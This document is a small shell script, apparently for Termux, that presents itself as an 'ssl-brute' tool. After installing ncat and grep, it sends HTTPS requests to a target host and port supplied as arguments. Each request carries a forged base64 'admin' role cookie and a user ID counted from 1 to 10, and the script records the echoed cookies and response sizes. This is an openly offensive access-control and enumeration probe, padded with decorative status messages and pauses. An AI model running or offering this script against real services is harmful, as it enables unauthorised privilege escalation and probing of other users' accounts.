#!/bin/sh

sleep 2
clear

sleep 1
echo "[>_] Script loading..."
sleep 3
echo "[>_] Hitting to $1:$2..."
sleep 1
echo "[>_] Warning: This script need up-to-date terminal!"
sleep 1
echo "[>_] Running update and upgrade scripts..."
sleep 1

apt update -y
clear
apt upgrade -y
clear

echo "[>_] Up-To-Date process completed!"
sleep 1
echo "[>_] Installing dependencies..."
sleep 1

pkg install apt -y
apt install ncat -y
apt install grep -y
clear

sleep 1
echo "[>_] Dependencies installed successfully!"
sleep 1
echo "[>_] Running ssl-brute to $1:$2..."
sleep 1

for id1 in {1..10}; do
  echo -n "Testing ID $id1: "
  (echo -e "GET /get HTTP/1.1\r\nHost: postman-echo.com\r\nCookie: role=YWRtaW4=; user_id=$id1\r\nConnection: close\r\n\r\n"; sleep 1) | ncat --ssl $1 $2 | grep -oP '"cookie":"[^"]+"'
done

echo "[>_] Checking content length..."
sleep 1

for id2 in {1..10}; do
  LEN=$( (echo -e "GET /get HTTP/1.1\r\nHost: postman-echo.com\r\nCookie: role=YWRtaW4=; user_id=$id2\r\nConnection: close\r\n\r\n"; sleep 1) | ncat --ssl $1 $2 | grep -i "Content-Length" | awk '{print $2}')
  echo "User ID $id2 -> Response Size: $LEN bytes"
done


sleep 1
echo "[>_] Process completed!"
sleep 1
